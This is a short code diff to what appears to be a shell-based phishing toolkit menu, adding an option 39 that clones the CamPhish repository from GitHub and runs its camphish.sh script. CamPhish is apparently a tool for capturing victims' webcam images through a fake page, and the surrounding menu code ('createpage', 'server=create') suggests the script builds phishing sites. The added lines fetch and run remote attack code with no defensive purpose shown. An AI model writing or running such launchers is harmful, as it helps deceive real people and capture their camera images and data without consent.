@@ -187,6 +187,14 @@ server="create"
 createpage
 start
 
+elif [[ $option == 39 ]]; then
+  if [[ ! -d 'sites/CamPhish' ]]; then
+    echo "Installing CamPhish"
+    git clone https://github.com/techchipnet/CamPhish sites/CamPhish
+  fi
+  cd sites/CamPhish
+  bash camphish.sh
+
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
 menu
